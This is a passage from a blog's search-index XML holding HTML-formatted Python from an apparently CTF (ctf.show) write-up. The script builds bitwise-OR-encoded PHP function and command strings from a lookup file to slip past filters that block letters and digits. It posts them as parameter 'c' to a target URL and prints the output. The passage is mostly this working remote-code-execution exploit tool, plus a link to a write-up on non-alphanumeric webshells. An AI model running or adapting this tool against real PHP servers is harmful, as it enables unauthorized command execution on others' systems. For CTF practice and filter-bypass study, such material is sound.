http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">无字母数字webshell</a></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
</search>
